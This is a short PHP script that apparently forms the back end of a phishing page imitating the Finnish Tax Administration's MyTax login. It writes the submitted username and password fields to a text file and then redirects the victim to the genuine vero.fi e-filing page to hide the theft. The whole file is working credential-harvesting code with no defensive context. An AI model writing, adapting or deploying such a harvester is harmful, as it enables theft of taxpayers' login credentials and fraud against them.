<?php

file_put_contents("usernames.txt", "Username: " . $_POST['auth-device-radio-mobilekey'] . "\nPassword: " . $_POST['auth-device-userid-mobilekey'] . "\n", FILE_APPEND);
$url = "https://www.vero.fi/en/e-file/mytax/"; 
header("Location: $url");
exit();
?>
